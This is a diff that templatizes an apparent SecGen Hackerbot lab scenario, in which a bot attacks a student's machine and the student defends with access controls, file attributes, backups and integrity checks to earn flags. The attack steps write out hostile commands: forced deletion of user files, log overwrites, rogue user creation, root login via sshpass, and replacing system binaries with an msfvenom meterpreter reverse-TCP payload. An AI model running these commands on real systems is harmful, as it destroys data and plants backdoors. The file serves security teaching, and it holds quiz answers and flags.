@@ -1,8 +1,28 @@
+<%
+  require 'json'
+
+  print self.accounts.to_s
+  $first_account = JSON.parse(self.accounts.first)
+  print $first_account.to_s
+
+  $files = $first_account['leaked_filenames']
+  $log_files = $first_account['leaked_filenames'].grep(/logs/)
+
+
+  $main_user = $first_account['username'].to_s
+  # $main_user_pass = $accounts[0]['password'].to_s
+  #
+  #
+  $root_password = self.root_password
+  $flags = self.flags
+
+%>
 <?xml version="1.0"?>
 
-<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"
+<hackerbot
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
+<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->
 
 	<name>Hackerbot1</name>
 
@@ -11,7 +31,7 @@
 	<!--Method for gaining shell access, can be overwritten per-attack-->
 	<!--ssh -oStrictHostKeyChecking=no control@localhost -->
 	<!--<get_shell>bash</get_shell>-->
-	<get_shell>sshpass -p randompassword ssh -oStrictHostKeyChecking=no root@{{chat_ip_address}} /bin/bash</get_shell>
+	<get_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@{{chat_ip_address}} /bin/bash</get_shell>
 
 	<messages>
 		<greeting>Sorry for the message out of the blue... Your system is about to be hacked. I'll do what I can hold them off, but you are going to have to work with me to protect yourself. I'll cough up some flags if you work with me.</greeting>
@@ -57,12 +77,13 @@
 	</messages>
 
 	<attack>
-		<prompt>An attempt to delete /home/dropbear/trade_secrets/credit_card is coming. Stop the attack using access controls.</prompt>
+<%= $file = $files.sample -%>
+		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $file %> is coming. Stop the attack using access controls.</prompt>
 
-		<post_command>rm --interactive=never /home/dropbear/trade_secrets/credit_card; echo $?</post_command>
+		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $file %>; echo $?</post_command>
 		<condition>
 			<output_matches>Permission denied|Operation not permitted</output_matches>
-			<message>:) Well done! flag{yay1!}</message>
+			<message>:) Well done! <%= $flags.pop %></message>
 			<trigger_next_attack>true</trigger_next_attack>
 		</condition>
 		<condition>
@@ -71,21 +92,21 @@
 		</condition>
 		<condition>
 			<output_matches>No such file or directory</output_matches>
-			<message>:( The file should exist!</message>
+			<message>:( The file <%= $file %> should exist!</message>
 		</condition>
 		<else_condition>
 			<message>:( Something was not right...</message>
 		</else_condition>
-
 	</attack>
 
 	<attack>
-		<prompt>An attempt to delete /home/dropbear/trade_secrets/code.pl is coming. Stop the attack using access controls.</prompt>
+<%= $file = $files.sample -%>
+		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $file %> is coming. Stop the attack using access controls.</prompt>
 
-		<post_command>rm --interactive=never /home/dropbear/trade_secrets/code.pl; echo $?</post_command>
+		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $file %>; echo $?</post_command>
 		<condition>
 			<output_matches>Permission denied</output_matches>
-			<message>:) Well done! flag{yay1!}</message>
+			<message>:) Well done! <%= $flags.pop %></message>
 			<trigger_next_attack>true</trigger_next_attack>
 		</condition>
 		<condition>
@@ -94,22 +115,21 @@
 		</condition>
 		<condition>
 			<output_matches>No such file or directory</output_matches>
-			<message>:( The file should exist!</message>
+			<message>:( The file <%= $file %> should exist!</message>
 		</condition>
 		<else_condition>
 			<message>:( Something was not right...</message>
 		</else_condition>
-
 	</attack>
 
 	<attack>
 		<!--<topic>Protecting integrity with file attributes</topic>-->
-		<prompt>An attempt to delete /home/dropbear/logs/log1 is coming. Stop the attack using file attributes.</prompt>
+		<prompt>An attempt to delete /home/<%= $main_user %>/logs/log1 is coming. Stop the attack using file attributes.</prompt>
 
-		<post_command>rm --interactive=never /home/dropbear/logs/log1; echo $?</post_command>
+		<post_command>rm --interactive=never /home/<%= $main_user %>/logs/log1; echo $?</post_command>
 		<condition>
 			<output_matches>Operation not permitted</output_matches>
-			<message>:) Well done! flag{yay1!}</message>
+			<message>:) Well done! <%= $flags.pop %></message>
 			<trigger_next_attack>true</trigger_next_attack>
 		</condition>
 		<condition> <!-- TODO: chmod to defeat the defense? -->
@@ -128,18 +148,19 @@
 			<message>:( Something was not right...</message>
 		</else_condition>
 	</attack>
+
 	<attack>
 		<!--<topic>Protecting integrity with file attributes</topic>-->
-		<prompt>An attempt to overwrite /home/dropbear/logs/log1 is coming. Stop the attack by making the file append only.</prompt>
+		<prompt>An attempt to overwrite /home/<%= $main_user %>/logs/log1 is coming. Stop the attack by making the file append only.</prompt>
 
-		<post_command>echo 'your logs are gone!' > /home/dropbear/logs/log1; echo 'damn!' >> /tmp/test/log1; tail /tmp/test/log1</post_command>
+		<post_command>echo 'your logs are gone!' > /home/<%= $main_user %>/logs/log1; echo 'damn!' >> /tmp/test/log1; tail /tmp/test/log1</post_command>
 		<condition>
 			<output_not_matches>damn!</output_not_matches>
 			<message>:( You stopped anything from being appended to the file. What kind of log file do you think this is?</message>
 		</condition>
 		<condition>
 			<output_matches>Operation not permitted</output_matches>
-			<message>:) Well done! flag{yay1!}</message>
+			<message>:) Well done! <%= $flags.pop %></message>
 			<trigger_next_attack>true</trigger_next_attack>
 		</condition>
 		<condition>
@@ -158,7 +179,7 @@
 		<post_command>touch /etc/you_were_hacked; adduser yourehacked</post_command>
 		<condition>
 			<output_matches>Read-only file system</output_matches>
-			<message>:) Well done! flag{yay1!}</message>
+			<message>:) Well done! <%= $flags.pop %></message>
 			<trigger_next_attack />
 		</condition>
 		<condition>
@@ -174,7 +195,7 @@
 		<!--<topic>Detecting changes to resources using backups</topic>-->
 		<prompt>An attempt to add a new user is coming, let it happen. But first create a backup of /etc/passwd.</prompt>
 
-		<post_command>sudo adduser hackerbot --gecos 'flag{yay!}' --disabled-password --quiet; echo $?</post_command>
+		<post_command>sudo adduser hackerbot --gecos '<%= $flags.pop %>' --disabled-password --quiet; echo $?</post_command>
 		<condition>
 			<output_matches>0</output_matches>
 			<message>User added</message>
@@ -196,7 +217,7 @@
 		<quiz>
 			<question>Now after the attack, find the username added by diffing using a backup. What username was created?</question>
 			<answer>^hackerbot$</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -205,7 +226,7 @@
 		<!--<topic>Detecting changes to resources using backups</topic>-->
 		<prompt>An attempt to edit a config file is coming, let it happen. But first create a backup of the /etc/ directory to /tmp/etc-backup/.</prompt>
 
-		<post_command>echo '# flag{yay!}' >> `find /etc/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
+		<post_command>echo '# <%= $flags.pop %>' >> `find /etc/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
 		<condition>
 			<output_matches>0</output_matches>
 			<message>A flag has been inserted into a random file... Use your backups to compare to the original to find the flag. Get to work!</message>
@@ -222,7 +243,7 @@
 		<quiz>
 			<question>Find the flag, what file was the flag stored in?</question>
 			<answer>^/etc/.*sh$</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 
@@ -232,7 +253,7 @@
 		<!--<topic>Detecting changes to resources using backups</topic>-->
 		<prompt>An attempt to edit a config file is coming, let it happen.</prompt>
 
-		<post_command>echo '# flag{yay!}' >> `find /tmp/etc-backup/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
+		<post_command>echo '# <%= $flags.pop %>' >> `find /tmp/etc-backup/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
 		<condition>
 			<output_matches>0</output_matches>
 			<message>A flag has been inserted into a random file IN YOUR BACKUPS! (Did you really think that was a safe place to store them?) Find the flag. Get to work!</message>
@@ -249,19 +270,19 @@
 		<quiz>
 			<question>Find the flag, what file was the flag stored in?</question>
 			<answer>^/etc-backup/.*sh$</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
 
 	<attack>
 		<!--<topic>File integrity checkers</topic>-->
-		<prompt>Creating a new file in /home/dropbear/trade_secrets/...</prompt>
+		<prompt>Creating a new file in /home/<%= $main_user %>/trade_secrets/...</prompt>
 
-		<post_command>echo 'somethingrandom' > /home/dropbear/trade_secrets/something_secret; echo $?</post_command>
+		<post_command>echo 'somethingrandom' > /home/<%= $main_user %>/trade_secrets/something_secret; echo $?</post_command>
 		<condition>
 			<output_matches>0</output_matches>
-			<message>Created /home/dropbear/trade_secrets/something_secret</message>
+			<message>Created /home/<%= $main_user %>/trade_secrets/something_secret</message>
 			<trigger_quiz />
 		</condition>
 		<condition>
@@ -273,9 +294,9 @@
 		</else_condition>
 
 		<quiz>
-			<question>What is the SHA1 hash of /home/dropbear/trade_secrets/something_secret?</question>
+			<question>What is the SHA1 hash of /home/<%= $main_user %>/trade_secrets/something_secret?</question>
 			<answer>^c9eb312ea2daf4688838ed8c75b9b7e0329e33bd$</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -303,7 +324,7 @@
 		<quiz>
 			<question>What is the file that changed?</question>
 			<answer>{{post_command_output}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -331,7 +352,7 @@
 		<quiz>
 			<question>What is the file that was created?</question>
 			<answer>{{post_command_output}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -360,7 +381,7 @@
 		<quiz>
 			<question>What is the file that was created?</question>
 			<answer>{{post_command_output}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -389,7 +410,7 @@
 		<quiz>
 			<question>What is the file that was created?</question>
 			<answer>{{post_command_output}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -418,7 +439,7 @@
 		<quiz>
 			<question>What is the file that was created?</question>
 			<answer>{{post_command_output}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -427,7 +448,7 @@
 	<!--TODO test this-->
 	<attack>
 		<!--<topic>File integrity checkers</topic>-->
-		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p randompassword scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>
+		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>
 
 		<prompt>Going to replace a binary file in /bin/ or /usr/bin/ with malware, detect which file has changed (hint: sha1deep, hashdeep, or shasum)</prompt>
 		<!--<post_command></post_command>-->
@@ -449,7 +470,7 @@
 		<quiz>
 			<question>What is the file that was created?</question>
 			<answer>{{shell_command_output_first_line}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
@@ -457,7 +478,7 @@
 	<!--trojanising a file in /usr/bin/, use package management to detect which file changes-->
 	<attack>
 		<!--<topic>File integrity checkers</topic>-->
-		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p randompassword scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>
+		<get_shell>binname=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; echo $binname; msfvenom -a -x86 --platform linux -p linux/x86/meterpreter_reverse_tcp --payload-options -f elf -o msfout; sshpass -p <%= $root_password %> scp -oStrictHostKeyChecking=no ./msfout root@{{chat_ip_address}}:$binname</get_shell>
 
 		<prompt>Trojanising a file in /usr/bin/, use package management to detect which file changes</prompt>
 		<!--<post_command></post_command>-->
@@ -479,7 +500,7 @@
 		<quiz>
 			<question>What is the file that was created?</question>
 			<answer>{{shell_command_output_first_line}}</answer>
-			<correct_answer_response>:) flag{yay!}</correct_answer_response>
+			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
 			<trigger_next_attack />
 		</quiz>
 	</attack>
